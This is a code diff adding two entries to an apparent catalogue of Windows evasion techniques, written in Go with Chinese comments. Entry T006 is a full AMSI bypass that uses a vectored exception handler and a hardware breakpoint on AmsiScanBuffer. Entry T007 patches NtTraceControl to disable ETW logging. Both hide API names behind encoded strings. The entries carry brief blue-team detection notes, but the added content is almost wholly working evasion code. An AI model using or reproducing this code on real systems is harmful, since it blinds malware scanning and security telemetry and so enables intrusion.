@@ -238,6 +238,136 @@ func evasionT005() {
 	}
 }`,
 	},
+	{
+		ID:          "T006",
+		Name:        "Hardware Breakpoint AMSI Bypass",
+		Description: "使用 VEH + 硬件断点拦截 AmsiScanBuffer，无需修改代码段内存，规避完整性校验",
+		Category:    CatHookBypass,
+		APIs:        []string{"AddVectoredExceptionHandler", "GetThreadContext", "SetThreadContext", "GetCurrentThread"},
+		Complexity:  4,
+		// evasionT006: 完整实现 VEH + DR0 硬件断点 AMSI bypass
+		// 流程：注册 VEH → 设置 DR0 = AmsiScanBuffer → 触发时 VEH 修改 RIP 跳过函数
+		CodeSnippet: `// hwbpAmsiTarget 保存 AmsiScanBuffer 地址，供 VEH handler 比对
+var hwbpAmsiTarget uintptr
+
+// hwbpVEHHandler 是 VEH 异常处理回调
+// 当硬件断点触发 SINGLE_STEP 异常时：
+//   1. 检查异常地址是否为 AmsiScanBuffer 入口
+//   2. 如果匹配，修改 RAX = 0x80070057 (E_INVALIDARG) 使 AMSI 认为扫描失败
+//   3. 修改 RIP 跳过函数（指向 ret 指令），避免实际执行 AmsiScanBuffer
+//   4. 清除 DR0 断点，防止重复触发
+// 参数 exceptionInfo 是 EXCEPTION_POINTERS 结构体指针
+// 返回 EXCEPTION_CONTINUE_EXECUTION (-1) 或 EXCEPTION_CONTINUE_SEARCH (0)
+func hwbpVEHHandler(exceptionInfo uintptr) uintptr {
+	// EXCEPTION_POINTERS { ExceptionRecord *EXCEPTION_RECORD; ContextRecord *CONTEXT }
+	record := *(*uintptr)(unsafe.Pointer(exceptionInfo))
+	ctxPtr := *(*uintptr)(unsafe.Pointer(exceptionInfo + 8))
+	if record == 0 || ctxPtr == 0 {
+		return 0 // EXCEPTION_CONTINUE_SEARCH
+	}
+	// EXCEPTION_RECORD.ExceptionCode at offset 0
+	exCode := *(*uint32)(unsafe.Pointer(record))
+	// EXCEPTION_SINGLE_STEP = 0x80000004
+	if exCode != 0x80000004 {
+		return 0
+	}
+	// CONTEXT.Rip at offset 248 (0xF8) in x64 CONTEXT
+	rip := *(*uintptr)(unsafe.Pointer(ctxPtr + 248))
+	if rip != hwbpAmsiTarget {
+		return 0
+	}
+	// 修改 RAX = E_INVALIDARG (0x80070057)，AmsiScanBuffer 的调用者会认为扫描失败
+	// CONTEXT.Rax at offset 120 (0x78)
+	*(*uintptr)(unsafe.Pointer(ctxPtr + 120)) = 0x80070057
+	// 修改 RIP：跳过 AmsiScanBuffer，直接 ret
+	// 读取 [rsp] 作为返回地址，设置 RIP = [rsp]，rsp += 8
+	// CONTEXT.Rsp at offset 152 (0x98)
+	rsp := *(*uintptr)(unsafe.Pointer(ctxPtr + 152))
+	retAddr := *(*uintptr)(unsafe.Pointer(rsp))
+	*(*uintptr)(unsafe.Pointer(ctxPtr + 248)) = retAddr // RIP = return address
+	*(*uintptr)(unsafe.Pointer(ctxPtr + 152)) = rsp + 8 // RSP += 8 (pop)
+	// 清除 DR0 断点：DR7 bit 0 = 0
+	dr7 := *(*uintptr)(unsafe.Pointer(ctxPtr + 168)) // CONTEXT.Dr7 at offset 168 (0xA8)
+	dr7 &^= 1
+	*(*uintptr)(unsafe.Pointer(ctxPtr + 168)) = dr7
+	*(*uintptr)(unsafe.Pointer(ctxPtr + 128)) = 0 // DR0 = 0, offset 128 (0x80)
+	return 0xFFFFFFFF // EXCEPTION_CONTINUE_EXECUTION (-1)
+}
+
+// evasionT006 使用硬件断点 + VEH 拦截 AmsiScanBuffer
+// 原理：在 AmsiScanBuffer 入口设置 DR0 硬件断点，VEH 捕获 SINGLE_STEP 异常后
+// 修改 RAX 返回 E_INVALIDARG 并跳过函数体，无需 patch 代码段（绕过 CIG/完整性校验）
+// 【蓝队检测】DR 寄存器非零 + VEH 注册 + AmsiScanBuffer 返回值异常
+func evasionT006() {
+	k32 := kernel32()
+	addVEH := getProcAddr(k32, ds("ENC:AddVectoredExceptionHandler"))
+	if addVEH == 0 {
+		return
+	}
+	// 获取 AmsiScanBuffer 地址
+	amsiMod, err := syscall.LoadLibrary(ds("ENC:amsi.dll"))
+	if err != nil {
+		return
+	}
+	amsiAddr := getProcAddr(uintptr(amsiMod), ds("ENC:AmsiScanBuffer"))
+	if amsiAddr == 0 {
+		return
+	}
+	hwbpAmsiTarget = amsiAddr
+
+	// 注册 VEH handler（第一个参数 1 = 优先处理）
+	cb := syscall.NewCallback(hwbpVEHHandler)
+	ret, _, _ := syscall.Syscall(addVEH, 2, 1, cb, 0)
+	if ret == 0 {
+		return
+	}
+
+	// 设置硬件断点 DR0 = AmsiScanBuffer 入口
+	getCtx := getProcAddr(k32, ds("ENC:GetThreadContext"))
+	setCtx := getProcAddr(k32, ds("ENC:SetThreadContext"))
+	curThread := getProcAddr(k32, ds("ENC:GetCurrentThread"))
+	if getCtx == 0 || setCtx == 0 || curThread == 0 {
+		return
+	}
+	hThread, _, _ := syscall.Syscall(curThread, 0, 0, 0, 0)
+	// CONTEXT 结构体大小 1232 字节 (x64)
+	// ContextFlags at offset 48 (0x30), CONTEXT_DEBUG_REGISTERS = 0x100010
+	ctx := make([]byte, 1232)
+	*(*uint32)(unsafe.Pointer(&ctx[48])) = 0x100010
+	syscall.Syscall(getCtx, 2, hThread, uintptr(unsafe.Pointer(&ctx[0])), 0)
+	// Dr0 at offset 128 (0x80), Dr7 at offset 168 (0xA8)
+	*(*uintptr)(unsafe.Pointer(&ctx[128])) = amsiAddr
+	dr7 := *(*uintptr)(unsafe.Pointer(&ctx[168]))
+	dr7 |= 1 // enable DR0 local breakpoint
+	*(*uintptr)(unsafe.Pointer(&ctx[168])) = dr7
+	*(*uint32)(unsafe.Pointer(&ctx[48])) = 0x100010
+	syscall.Syscall(setCtx, 2, hThread, uintptr(unsafe.Pointer(&ctx[0])), 0)
+}`,
+	},
+	{
+		ID:          "T007",
+		Name:        "ETW Blind via NtTraceControl",
+		Description: "通过 patch NtTraceControl 禁用内核级 ETW 会话创建，比单纯 patch EtwEventWrite 更彻底",
+		Category:    CatHookBypass,
+		APIs:        []string{"NtTraceControl"},
+		Complexity:  3,
+		CodeSnippet: `// evasionT007 patch NtTraceControl 禁用 ETW 会话管理
+// 原理：NtTraceControl 是 ETW 基础设施的底层入口，patch 后新的 ETW 会话无法创建
+// 比 patch EtwEventWrite 更彻底，因为它阻止了 ETW provider 的注册和启动
+// 【蓝队检测】NtTraceControl 入口字节被修改 + ETW 会话创建失败日志
+func evasionT007() {
+	nt := ntdll()
+	if nt == 0 {
+		return
+	}
+	ntTraceControl := getProcAddr(nt, ds("ENC:NtTraceControl"))
+	if ntTraceControl == 0 {
+		return
+	}
+	// patch 入口为 xor eax,eax; ret (返回 STATUS_SUCCESS)
+	patchAddr(ntTraceControl, []byte{0x31, 0xC0, 0xC3})
+}`,
+	},
 }
 
 // ByID 按 ID 查找技术，未找到返回 nil
